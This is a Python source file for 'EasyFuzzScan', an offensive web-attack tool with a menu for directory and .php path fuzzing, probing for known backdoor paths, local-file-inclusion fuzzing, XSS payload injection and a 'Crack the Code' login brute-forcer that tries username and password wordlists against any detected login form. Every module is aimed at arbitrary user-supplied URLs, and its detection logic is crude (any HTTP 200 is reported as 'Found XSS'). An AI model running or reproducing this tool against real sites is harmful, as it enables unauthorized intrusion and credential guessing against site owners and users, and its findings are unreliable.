from PIL import Image
import os
import requests
import sys
import re
import subprocess
import argparse
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse
from bs4 import BeautifulSoup
from colorama import Fore, Style, init

# ANSI escape codes for colors
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
RESET = '\033[0m'

# Common sensitive paths to detect high vulnerabilities
SENSITIVE_PATHS = ["admin", "login", "config", "db", "database", "passwd", "private", "backup"]

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def animate_loading(duration=2):
    spinner = ['/', '-', '\\', '|']
    end_time = time.time() + duration
    while time.time() < end_time:
        for symbol in spinner:
            sys.stdout.write(f"\r{symbol} Loading...")
            sys.stdout.flush()
            time.sleep(0.1)

if __name__ == "__main__":
    animate_loading()


def main_menu():
    while True:
        clear_screen()
        print(r"""
          
    >>================================================================<<
    || _____                _____               ____                  ||
    ||| ____|__ _ ___ _   _|  ___|   _ ________/ ___|  ___ __ _ _ __  ||
    |||  _| / _` / __| | | | |_ | | | |_  /_  /\___ \ / __/ _` | '_ \ ||
    ||| |__| (_| \__ \ |_| |  _|| |_| |/ / / /  ___) | (_| (_| | | | ||
    |||_____\__,_|___/\__, |_|   \__,_/___/___||____/ \___\__,_|_| |_|||
    ||                |___/                                           ||
    >>================================================================<<
    
    Welcome to EasyFuzzScan Script! Here you can choose a lot of things!
    Made By: https://github.com/awiones

    [1] Scan Directory 
    [2] Common Backdoor
    [3] LFI Test
    [4] Crack the Code!
    [5] XSS Test
    [6] Search Parameters
    [7] Deep Scan
    [0] Exit
    """)
        choice = input("\nPick one: ").strip()
        return choice


def scan_directory():
    while True:
        clear_screen()
        print(r"""
    
    >>================================================================<<
    || _____                _____               ____                  ||
    ||| ____|__ _ ___ _   _|  ___|   _ ________/ ___|  ___ __ _ _ __  ||
    |||  _| / _` / __| | | | |_ | | | |_  /_  /\___ \ / __/ _` | '_ \ ||
    ||| |__| (_| \__ \ |_| |  _|| |_| |/ / / /  ___) | (_| (_| | | | |||
    |||_____\__,_|___/\__, |_|   \__,_/___/___||____/ \___\__,_|_| |_|||
    ||                |___/                                           ||
    >>================================================================<<

    Welcome to EasyFuzzScan Script here you can choose a lot of things!
    Made by: https://github.com/awiones
    """)
        print("[1] Scan Directory has been selected!")
        print("    1. Scan with small file!")
        print("    2. Scan with Medium file!")
        print("    3. Scan with Large file!")
        print("[4] Search .php URLs!")
        print("[5] Is this web have robots.txt?")
        print("[0] Back to main menu")
        choice = input("\nPick one: ").strip()

        if choice == "0":
            break
        
        if choice == "4":
            php_file = "Scan/Directory/php/php_file.txt"
            if os.path.isfile(php_file):
                url = input("Type the base URL (e.g., https://example.com): ").strip()
                if not url.startswith("http://") and not url.startswith("https://"):
                    url = "https://" + url

                save_results = input("\nWould you like to save the search results? (yes/no): ").strip().lower()
                if save_results == 'yes':
                    use_default_folder = input("\nWould you like to save the results in the default folder 'results'? (yes/no): ").strip().lower()
                    if use_default_folder == 'yes':
                        results_folder = "results"
                    else:
                        results_folder = input("\nWhere would you like to save the results? Type the folder path: ").strip()
                else:
                    results_folder = None

                if results_folder:
                    os.makedirs(results_folder, exist_ok=True)
                    domain = urlparse(url).netloc.replace("www.", "")
                    result_file = os.path.join(results_folder, f"{domain}_php_results.txt")
                else:
                    result_file = None

                search_php_urls(url, php_file, result_file)
            else:
                print(f"\nError: The PHP file '{php_file}' was not found.")

        elif choice == "5":
            url = input("Type the base URL (e.g., https://example.com): ").strip()
            if not url.startswith("http://") and not url.startswith("https://"):
                url = "https://" + url
            
            # Remove trailing slash
            if url.endswith('/'):
                url = url[:-1]
            
            robots_url = f"{url}/robots.txt"
            try:
                response = requests.get(robots_url)
                if response.status_code == 200:
                    print(f"{Fore.GREEN}\nRobots.txt found at {robots_url}{Style.RESET_ALL}")
                    print("\n===================================================")
                    print(f"Contents:\n{response.text}")
                    print("\n===================================================")
                    if 'Sitemap:' in response.text:
                        sitemap_lines = [line.strip() for line in response.text.splitlines() if line.strip().startswith('Sitemap:')]
                        if sitemap_lines:
                            print(f"\nSitemap: {', '.join(sitemap_lines)}")
                    print("=====================================================")
                elif response.status_code == 404:
                    print(f"{Fore.RED}\nRobots.txt not found at {robots_url}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.YELLOW}\nUnexpected status code {response.status_code} for {robots_url}{Style.RESET_ALL}")
            except requests.RequestException as e:
                print(f"Error accessing {robots_url}: {e}")


        
        else:
            file_choice = {
                "1": "Scan/Directory/small.txt",
                "2": "Scan/Directory/medium.txt",
                "3": "Scan/Directory/large.txt"
            }.get(choice, None)

            if file_choice:
                print(f"\n[1] You have selected {os.path.basename(file_choice).replace('.txt', '').capitalize()} file! Now give the URL and we'll search the link!")
                url = input("Type here: ").strip()
                if not url.startswith("http://") and not url.startswith("https://"):
                    url = "https://" + url

                if os.path.isfile(file_choice):
                    save_results = input("\nWould you like to save the scan results? (yes/no): ").strip().lower()
                    if save_results == 'yes':
                        use_default_folder = input("\nWould you like to save the results in the default folder 'results'? (yes/no): ").strip().lower()
                        if use_default_folder == 'yes':
                            results_folder = "results"
                        else:
                            results_folder = input("\nWhere would you like to save the results? Type the folder path: ").strip()
                    else:
                        results_folder = None

                    if results_folder:
                        os.makedirs(results_folder, exist_ok=True)
                        domain = urlparse(url).netloc.replace("www.", "")
                        result_file = os.path.join(results_folder, f"{domain}.txt")
                    else:
                        result_file = None

                    scan_url_with_file(url, file_choice, result_file)
                else:
                    print(f"\nError: The file '{file_choice}' was not found.")
            else:
                print("Invalid choice! Please pick a valid option or press '0' to go back.")

        input("\nPress Enter to continue...")

init(autoreset=True)

def check_url(base_url, php_path, filter_no_error, filter_no_restricted):
    php_url = f"{base_url.rstrip('/')}/{php_path.strip()}.php"  # Ensure correct URL formatting
    try:
        response = requests.get(php_url, timeout=5)
        status_code = response.status_code
        print(f"Debug: {php_url} returned {status_code}")  # Debug output
        
        if status_code == 200:
            return f"{Fore.GREEN}Oho~ found something? Maybe it's just something normal~ | {php_url} | Check that one big boy{Style.RESET_ALL}"
        elif status_code == 301 and not filter_no_restricted:
            return f"{Fore.YELLOW}Meh, need authorization | {php_url} | Go test it{Style.RESET_ALL}"
        elif status_code == 404 and not filter_no_error:
            return f"{Fore.RED}404 Not Found | {php_url}{Style.RESET_ALL}"
        elif status_code == 400 and not filter_no_error:
            return f"{Fore.RED}400 Bad Request | {php_url}{Style.RESET_ALL}"
    except requests.RequestException as e:
        return f"Error with URL {php_url}: {e}"

    return None

def search_php_urls(base_url, php_file, result_file=None):
    if not os.path.isfile(php_file):
        print(f"Error: The file '{php_file}' does not exist.")
        return

    filter_no_error = input("Filter no error (404) (yes/no): ").strip().lower() == 'yes'
    filter_no_restricted = input("Filter no restricted (301) (yes/no): ").strip().lower() == 'yes'
    
    with open(php_file, 'r') as file:
        lines = file.readlines()

    results = []
    found_php = False
    
    print(f"\nStarting scan for {base_url} using {os.path.basename(php_file)}...\n")
    
    with ThreadPoolExecutor(max_workers=200) as executor:
        future_to_url = {executor.submit(check_url, base_url, line, filter_no_error, filter_no_restricted): line for line in lines}
        
        for future in as_completed(future_to_url):
            result = future.result()
            if result:
                results.append(result)
                if Fore.GREEN in result or Fore.YELLOW in result:
                    found_php = True

    if not found_php:
        results.append(f"{Fore.RED}This website CMS was not even PHP.{Style.RESET_ALL}")

    if result_file:
        with open(result_file, 'w') as file:
            for result in results:
                file.write(f"{result}\n")
        print(f"\nResults saved to {result_file}")

    print(f"\nSearch complete. {len(results)} URLs found.")



def scan_url_with_file(base_url, file_name, result_file=None):
    spinner = ['/', '-', '\\', '|']
    spinner_idx = 0
    print(f"\nStarting scan for {base_url} using {file_name}...\n")
    with open(file_name, 'r') as file:
        results = []
        for line in file:
            directory = line.strip()
            full_url = base_url.rstrip('/') + '/' + directory
            try:
                # Animation: Updating the spinner
                sys.stdout.write(f"Here is scanning... {spinner[spinner_idx % len(spinner)]}\r")
                sys.stdout.flush()
                spinner_idx += 1
                time.sleep(0.1)  # Adjust the speed of the spinner here

                response = requests.get(full_url, timeout=5)
                if response.status_code == 200:
                    result = f"{GREEN}We sniffed something | {full_url} | It was GET and 200 Found!{RESET}"
                    print(result)
                    results.append(result)
                elif response.status_code == 301:
                    result = f"{YELLOW}We sniffed something | {full_url} | It was GET and 301 Redirected (Unauthorized)!{RESET}"
                    print(result)
                    results.append(result)
                elif any(path in directory for path in SENSITIVE_PATHS):
                    result = f"{RED}Oh no! This is a high vuln! | {full_url} | Check this out!{RESET}"
                    print(result)
                    results.append(result)
            except requests.RequestException as e:
                print(f"Error accessing {full_url}: {e}")
            except KeyboardInterrupt:
                print("\nScan interrupted by user.")
                break

        if result_file:
            with open(result_file, 'w') as rf:
                rf.write("\n".join(results))
            print(f"\nResults saved to {result_file}")

def common_backdoor_test():
    while True:
        clear_screen()
        print(r""""
              
        >>================================================================<<
        || _____                _____               ____                  ||
        ||| ____|__ _ ___ _   _|  ___|   _ ________/ ___|  ___ __ _ _ __  ||
        |||  _| / _` / __| | | | |_ | | | |_  /_  /\___ \ / __/ _` | '_ \ ||
        ||| |__| (_| \__ \ |_| |  _|| |_| |/ / / /  ___) | (_| (_| | | | |||
        |||_____\__,_|___/\__, |_|   \__,_/___/___||____/ \___\__,_|_| |_|||
        ||                |___/                                           ||
        >>================================================================<<
        
        Made by: https://github.com/awiones
        
        Select Backdoor Type:
        [1] PHP
        [2] ASP
        [3] Perl
        [4] JSP
        [0] Go Back to Main Menu
        """)
        choice = input("\nPick one: ").strip()

        if choice == "0":
            break

        file_choice = {
            "1": "Scan/Backdoor/PHP.txt",
            "2": "Scan/Backdoor/ASP.txt",
            "3": "Scan/Backdoor/PL.txt",
            "4": "Scan/Backdoor/JSP.txt"
        }.get(choice, None)

        if file_choice:
            url = input("\nEnter the URL to scan: ").strip()
            if not url.startswith("http://") and not url.startswith("https://"):
                url = "https://" + url

            if os.path.isfile(file_choice):
                save_results = input("\nWould you like to save the scan results? (yes/no): ").strip().lower()
                if save_results == 'yes':
                    use_default_folder = input("\nWould you like to save the results in the default folder 'results'? (yes/no): ").strip().lower()
                    if use_default_folder == 'yes':
                        results_folder = "results"
                    else:
                        results_folder = input("\nWhere would you like to save the results? Type the folder path: ").strip()
                else:
                    results_folder = None

                if results_folder:
                    os.makedirs(results_folder, exist_ok=True)
                    domain = urlparse(url).netloc.replace("www.", "")
                    result_file = os.path.join(results_folder, f"Backdoor_{domain}.txt")
                else:
                    result_file = None

                scan_backdoor(url, file_choice, result_file)
            else:
                print(f"\nError: The file '{file_choice}' was not found.")
        else:
            print("Invalid choice! Please pick a valid option or press '0' to go back.")

        input("\nPress Enter to continue...")

def scan_backdoor(base_url, file_name, result_file=None):
    spinner = ['/', '-', '\\', '|']
    spinner_idx = 0
    print(f"\nStarting scan for {base_url} using {file_name}...\n")
    with open(file_name, 'r') as file:
        results = []
        for line in file:
            directory = line.strip()
            full_url = base_url.rstrip('/') + '/' + directory
            try:
                # Animation: Updating the spinner
                sys.stdout.write(f"Here is scanning... {spinner[spinner_idx % len(spinner)]}\r")
                sys.stdout.flush()
                spinner_idx += 1
                time.sleep(0.1)  # Adjust the speed of the spinner here

                response = requests.get(full_url, timeout=5)
                if response.status_code == 200:
                    result = f"{GREEN}Found 200 OK | {full_url}{RESET}"
                    print(result)
                    results.append(result)
            except requests.RequestException as e:
                print(f"Error accessing {full_url}: {e}")
            except KeyboardInterrupt:
                print("\nScan interrupted by user.")
                break

        if result_file:
            with open(result_file, 'w') as rf:
                rf.write("\n".join(results))
            print(f"\nResults saved to {result_file}")
            
        
def lfi_fuzzing_menu():
    while True:
        try:
            clear_screen()
            print(r"""
            >>================================================================<<
            || _____                _____               ____                  ||
            ||| ____|__ _ ___ _   _|  ___|   _ ________/ ___|  ___ __ _ _ __  ||
            |||  _| / _` / __| | | | |_ | | | |_  /_  /\___ \ / __/ _` | '_ \ ||
            ||| |__| (_| \__ \ |_| |  _|| |_| |/ / / /  ___) | (_| (_| | | | |||
            |||_____\__,_|___/\__, |_|   \__,_/___/___||____/ \___\__,_|_| |_|||
            ||                |___/                                           ||
            >>================================================================<< 
                                                                                  
            You selected LFI testing, now give us the link! And don't forget to put FUZZ in the end!
            Made by: https://github.com/awiones
            """)
            url = input("Enter the URL (or '0' to go back): ").strip()

            if url == '0':
                return  # Go back to the main menu

            if 'FUZZ' not in url:
                print(RED + "Error: The URL must contain 'FUZZ' placeholder. Please try again." + RESET)
                print("Example: https://example.com/FUZZ")
                input("Press Enter to continue...")
                continue

            lfi_wordlist = "Scan/Fuzz/LFI.txt"  # Wordlist for LFI fuzzing

            # Prompt the user to save the results
            save_results = input("\nWould you like to save the scan results? (yes/no): ").strip().lower()
            if save_results == 'yes':
                use_default_folder = input("\nWould you like to save the results in the default folder 'results'? (yes/no): ").strip().lower()
                if use_default_folder == 'yes':
                    results_folder = "results"
                else:
                    results_folder = input("\nWhere would you like to save the results? Type the folder path: ").strip()
            else:
                results_folder = None

            if results_folder:
                os.makedirs(results_folder, exist_ok=True)
                domain = urlparse(url).netloc.replace("www.", "")
                result_file = os.path.join(results_folder, f"LFI_{domain}.txt")
            else:
                result_file = None

            perform_lfi_fuzzing(url, lfi_wordlist, result_file)
        except Exception:
            pass  # Suppress all errors

def perform_lfi_fuzzing(url, wordlist_file, result_file=None):
    try:
        # Open the wordlist with explicit UTF-8 encoding
        with open(wordlist_file, 'r', encoding='utf-8') as file:
            fuzz_paths = file.read().splitlines()
        
        print(f"Starting LFI Fuzzing with {wordlist_file}...")
        results = []
        spinner = ['/', '-', '\\', '|']
        spinner_idx = 0

        for path in fuzz_paths:
            fuzzed_url = url.replace("FUZZ", path)
            try:
                # Animation: Updating the spinner
                sys.stdout.write(f"Fuzzing... {spinner[spinner_idx % len(spinner)]}\r")
                sys.stdout.flush()
                spinner_idx += 1
                time.sleep(0.1)  # Adjust the speed of the spinner here

                response = requests.get(fuzzed_url, timeout=5)
                if response.status_code == 200:
                    result = f"{GREEN}Found 200 OK | {fuzzed_url}{RESET}"
                    print(result)
                    results.append(result)
                elif response.status_code == 301:
                    result = f"{YELLOW}Found 301 Moved Permanently | {fuzzed_url}{RESET}"
                    print(result)
                    results.append(result)
                elif response.status_code == 404:
                    # Ignore 404 Not Found
                    continue
                else:
                    print(f"Other Status: {fuzzed_url} (Status: {response.status_code})")
            except requests.RequestException:
                pass  # Suppress requests-related errors
            except KeyboardInterrupt:
                print("\nFuzzing interrupted by user.")
                break

        if result_file and results:
            with open(result_file, 'w', encoding='utf-8') as rf:
                rf.write("\n".join(results))
            print(f"\nResults saved to {result_file}")
        else:
            print("\nNo results to save.")
        
        input("Press Enter to continue...")
    except Exception:
        pass  # Suppress all errors


def xss_test_menu():
    clear_screen()
    print(r"""
          
    >>================================================================<<
    || _____                _____               ____                  ||
    ||| ____|__ _ ___ _   _|  ___|   _ ________/ ___|  ___ __ _ _ __  ||
    |||  _| / _` / __| | | | |_ | | | |_  /_  /\___ \ / __/ _` | '_ \ ||
    ||| |__| (_| \__ \ |_| |  _|| |_| |/ / / /  ___) | (_| (_| | | | |||
    |||_____\__,_|___/\__, |_|   \__,_/___/___||____/ \___\__,_|_| |_|||
    ||                |___/                                           ||
    >>================================================================<<
    
    >>================== XSS Test Menu ==================<<
    || Choose the XSS test you want to perform:           ||
    || [1] Start XSS Test                                 ||
    || [0] Back to Main Menu                              ||
    >>====================================================<<
    
    """)
    choice = input("Pick one: ").strip()
    
    if choice == '0':
        return  # Return to the main menu

    file_path = {
        "1": "Scan/Xss/Xss.txt",
    }.get(choice, None)

    if file_path is None:
        print("Invalid choice. Please try again.")
        input("Press Enter to continue...")
        xss_test_menu()  # Show the XSS menu again if the choice is invalid
        return

    if not os.path.exists(file_path):
        print("You can Fuzz this first on the main menu number 6!")
        input("Press Enter to continue...")
        return

    # Ask user if they want to scan multiple URLs (file) or a single URL
    input_choice = input("Would you like to scan XSS multiple links (File) or a single URL? (1 for File, 2 for Single): ").strip()

    if input_choice == '1':
        file_path_input = input("Enter the path to the file with URLs: ").strip()
        if not os.path.isfile(file_path_input):
            print("File does not exist. Please check the path and try again.")
            input("Press Enter to continue...")
            return
        with open(file_path_input, 'r', encoding='utf-8', errors='ignore') as input_file:
            urls = input_file.readlines()
    elif input_choice == '2':
        url = input("Enter the URL to scan: ").strip()
        urls = [add_protocol(url)]
    else:
        print("Invalid choice. Please enter '1' for File or '2' for Single.")
        input("Press Enter to continue...")
        return

    # Perform the XSS test
    perform_xss_test(file_path, urls)

def add_protocol(url):
    if not (url.startswith("http://") or url.startswith("https://")):
        url = "https://" + url
    return url

def perform_xss_test(file_path, urls):
    print("\n[XSS Started]")
    print("Start scanning...\n")

    found_xss = False
    last_url = None
    last_payload = None

    with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
        fuzz_patterns = file.readlines()

    for url in urls:
        url = url.strip()
        if not url:
            continue

        for pattern in fuzz_patterns:
            pattern = pattern.strip()
            if not pattern:
                continue

            test_url = f"{url}{pattern}"

            # Display scanning status
            sys.stdout.write(f"\rScanning: {url} with the payload {pattern}")
            sys.stdout.flush()

            status_code, response_text = scan_url(test_url)  # Perform the actual scan

            # Compact output based on the scan result
            if status_code == 200:
                found_xss = True
                last_url = url
                last_payload = pattern
                print(f"\n\033[92mFound XSS: {last_url}{last_payload}\033[0m")
                break  # Exit the inner loop if XSS is found

        if not found_xss:
            print(f"\nScanning URL: {url} with payloads {', '.join([p.strip() for p in fuzz_patterns])}")

    if not found_xss:
        print("No XSS vulnerabilities detected.")

    input("Press Enter to continue...")

def scan_url(url):
    try:
        response = requests.get(url)
        return response.status_code, response.text
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        return None, ""

def crack_the_code():
    clear_screen()
    print(r"""
          
        >>================================================================<<
        || _____                _____               ____                  ||
        ||| ____|__ _ ___ _   _|  ___|   _ ________/ ___|  ___ __ _ _ __  ||
        |||  _| / _` / __| | | | |_ | | | |_  /_  /\___ \ / __/ _` | '_ \ ||
        ||| |__| (_| \__ \ |_| |  _|| |_| |/ / / /  ___) | (_| (_| | | | |||
        |||_____\__,_|___/\__, |_|   \__,_/___/___||____/ \___\__,_|_| |_|||
        ||                |___/                                           ||
        >>================================================================<<
          
        Made by: https://github.com/awiones  
        """)
    print("[4] Crack the code has been selected!")
    
    url = input("Enter the URL of the login page: ").strip()
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url
    
    try:
        # Check if the page contains a login form
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Look for form elements with 'login' or 'password' in them
        forms = soup.find_all('form')
        login_form = None
        
        for form in forms:
            if form.find('input', {'type': 'password'}) or 'login' in form.get('action', '').lower():
                login_form = form
                break
        
        if login_form is None:
            print(RED + "Not a login website, duh!" + RESET)
            input("Press Enter to continue...")
            return

        print(GREEN + "Login form detected!" + RESET)
        
        # Prompt for username and password files
        username_file = input("\nPut your username possible file here: ").strip()
        password_file = input("\nPut your password possible file here: ").strip()
        
        if not os.path.isfile(username_file) or not os.path.isfile(password_file):
            print(RED + "Error: One or both files not found." + RESET)
            input("Press Enter to continue...")
            return

        # Extract the form's action URL (relative or absolute)
        action_url = login_form.get('action')
        if not action_url.startswith('http'):
            action_url = url.rstrip('/') + '/' + action_url.lstrip('/')

        # Extract the form method (GET or POST)
        method = login_form.get('method', 'post').lower()

        # Extract form fields
        inputs = login_form.find_all('input')
        form_data = {inp.get('name'): inp.get('value', '') for inp in inputs if inp.get('name')}

        with open(username_file, 'r') as uf, open(password_file, 'r') as pf:
            usernames = uf.read().splitlines()
            passwords = pf.read().splitlines()

            print(f"\nStarting brute force on {url}...\n")
            for username in usernames:
                for password in passwords:
                    # Update the form data with current username and password
                    form_data.update({'username': username, 'password': password})
                    
                    if method == 'post':
                        response = requests.post(action_url, data=form_data)
                    else:
                        response = requests.get(action_url, params=form_data)
                    
                    # Check if login was successful (e.g., by checking response content)
                    if "login failed" not in response.text.lower():
                        print(GREEN + f"Success! Username: {username} | Password: {password}" + RESET)
                        input("Press Enter to continue...")
                        return
                    else:
                        print(RED + f"Failed attempt: {username} | {password}" + RESET)
        
        print(RED + "\nBrute force attack completed. No valid credentials found." + RESET)
        input("Press Enter to continue...")
    
    except Exception as e:
        print(RED + f"Error: {e}" + RESET)
        input("Press Enter to continue...")

def deep_scan_menu():
    clear_screen()
    print(r"""
    >>================================================================<<
    || _____                _____               ____                  ||
    ||| ____|__ _ ___ _   _|  ___|   _ ________/ ___|  ___ __ _ _ __  ||
    |||  _| / _` / __| | | | |_ | | | |_  /_  /\___ \ / __/ _` | '_ \ ||
    ||| |__| (_| \__ \ |_| |  _|| |_| |/ / / /  ___) | (_| (_| | | | ||
    |||_____\__,_|___/\__, |_|   \__,_/___/___||____/ \___\__,_|_| |_|||
    ||                |___/                                           ||
    >>================================================================<<
    
    Deep Scan Menu:
    
    Erm Achtually im not that genius to make this by my own, just rype 0
    """)
    
    choice = input("\nPick one: ").strip()

    if choice == "0":
        return
    else:
        print("Invalid choice, please try again.")


def exit_program():
    clear_screen()

    # Open the image file
    image_path = "exit.jpg"
    if os.path.isfile(image_path):
        try:
            img = Image.open(image_path)
            img.show()  # Opens the image in the default image viewer
        except Exception as e:
            print(f"Error opening image: {e}")
    else:
        print("Image file not found.")

    # Print exit message
    print("\nBruh...")
    sys.exit(0)

def invalid_choice():
    print("Invalid choice! Please select a valid option.")

if __name__ == "__main__":
    while True:
        choice = main_menu()
        if choice == "1":
            scan_directory()
        elif choice == "2":
            common_backdoor_test()
        elif choice == "3":
            lfi_fuzzing_menu()
        elif choice == "4":
            crack_the_code()
        elif choice == '5':
            xss_test_menu()  
        elif choice == "6":
            url = input("What URL would you like to mine?: ")
            if url:
                # Run Fuzzing.py with the provided URL
                subprocess.run(["python", "Parameter/Fuzzing.py", "--domain", url])
            else:
                print("URL cannot be empty. Please try again.")
        elif choice == "7":
            deep_scan_menu()  # Navigate to the Deep Scan menu
        elif choice == "0":
            exit_program()
        else:
            invalid_choice()

        input("\nPress Enter to return to the main menu...")
